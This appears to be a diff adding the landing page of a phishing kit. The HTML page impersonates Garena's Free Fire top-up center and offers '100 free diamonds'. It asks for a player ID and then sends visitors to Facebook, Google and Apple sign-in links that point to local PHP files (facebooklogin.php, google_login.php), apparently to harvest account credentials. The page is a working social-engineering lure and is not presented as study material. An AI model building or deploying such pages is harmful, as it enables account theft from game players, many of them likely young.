@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Garena Top Up Center</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+    }
+  
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 10px 20px;
+      border-bottom: 1px solid #ddd;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+  
+    .header img {
+      height: 50px;
+      margin-right: 10px;
+    }
+  
+    .header h1 {
+      font-size: 18px;
+      color: #333;
+    }
+  
+    .banner {
+      width: 100%;
+      overflow: hidden;
+    }
+  
+    .banner img {
+      width: 100%;
+      max-height: 220px;
+      object-fit: cover;
+      display: block;
+    }
+  
+    .login-section {
+      width: 90%;
+      max-width: 500px;
+      margin: 30px auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+  
+    .login-section h2,
+    .login-section h3,
+    .login-section h1 {
+      display: flex;
+      align-items: center;
+      font-size: 20px;
+      color: #111;
+    }
+  
+    .login-section h2::before {
+      content: "1";
+      background-color: red;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      padding: 0 6px;
+      margin-right: 8px;
+    }
+  
+    .login-section h3::before {
+      content: "2";
+      background-color: red;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      padding: 0 6px;
+      margin-right: 8px;
+    }
+  
+    .login-section h1::before {
+      content: "3";
+      background-color: red;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      padding: 0 6px;
+      margin-right: 8px;
+    }
+  
+    .input-group {
+      margin: 20px 0;
+      display: flex;
+      flex-direction: row;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+  
+    .input-group input[type="text"] {
+      flex: 1;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      min-width: 200px;
+    }
+  
+    .input-group button {
+      background-color: #d80000;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+  
+    .or-login {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+    }
+  
+    .social-icons {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      flex-wrap: wrap;
+    }
+  
+    .social-icons img {
+      width: 36px;
+      height: 36px;
+      cursor: pointer;
+    }
+  
+    .er {
+      height: auto;
+      width: 100%;
+      text-align: center;
+      margin-top: 5%;
+      padding: 0 10px;
+    }
+  
+    .er span {
+      font-size: 32px;
+    }
+  
+    .er .sp {
+      font-size: 18px;
+    }
+  
+    .div1 .sp1 {
+      font-size: 18px;
+      color: rgb(0, 162, 255);
+      text-align: center;
+      display: block;
+      margin-top: 10px;
+    }
+  
+    .div1 {
+      width: 100%;
+      text-align: center;
+    }
+  
+    .diamond-card {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 20px 30px;
+      background-color: #fff;
+      border-radius: 10px;
+      border: 1px solid #ddd;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+      font-size: 24px;
+      font-weight: 600;
+      width: 80%;
+      max-width: 300px;
+      margin: 0 auto;
+    }
+  
+    @media (max-width: 600px) {
+      .header h1 {
+        font-size: 16px;
+        text-align: center;
+      }
+  
+      .er span {
+        font-size: 24px;
+      }
+  
+      .diamond-card {
+        font-size: 20px;
+        padding: 15px;
+      }
+  
+      .input-group {
+        flex-direction: column;
+      }
+  
+      .input-group button {
+        width: 100%;
+      }
+  
+      .social-icons {
+        gap: 10px;
+      }
+    }
+  </style>
+  
+</head>
+<body>
+
+  <div class="header">
+    <img src="g.png" alt="">
+    <h1> | Official Top Up Center</h1>
+  </div>
+
+  <div class="banner">
+    <img src="c.png" alt="Free Fire Banner">
+  </div>
+
+  <div class="er">
+    <span>Exclusive Rewards to Our FreeFire Players.</span> <br>
+    <span class="sp">Thanks to Install FreeFire.</span> <br> <br>
+    
+  </div>
+  <div class="div1">
+    <span class="sp1">Follow These Steps to Get Free 100 Diamonds: </span>
+  </div>
+  <div class="login-section">
+    <h2>Login</h2>
+    <div class="input-group">
+      <input type="text" placeholder="Please enter player ID here" />
+      <a href="garena2.html"><button onclick="validateAndRedirect()">Login</button></a>
+    </div>
+    
+  </div>
+  <div class="login-section">
+    <h3>Login</h3>
+    <div class="or-login">To check enter UID is valid or not, Login with your account:</div>
+    <div class="social-icons">
+      <a href="facebooklogin.php"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="Facebook"></a>
+      <a href="google_login.php"><img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google"></a>
+      <a href="google_login.php"><img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" alt="Apple"></a>
+      
+    </div>
+    </div>
+    <div class="login-section">
+        <h1>Get Free Diamonds</h1>
+        <div><span>Click on diamonds and get:</span></div> <br>
+        <div class="diamond-card">
+            <span class="icon">💎</span>
+            <span>100</span>
+          </div>
+    </div>
+    <script>
+      function validateAndRedirect() {
+        const input = document.querySelector('.input-group input[type="text"]');
+        const playerId = input.value.trim();
+    
+        if (playerId === "") {
+          alert("Please enter your Player ID.");
+          input.focus();
+        } else {
+          window.location.href = "/login struct/garena2.html";
+        }
+      }
+    </script>
+    
+</body>
+</html>
+
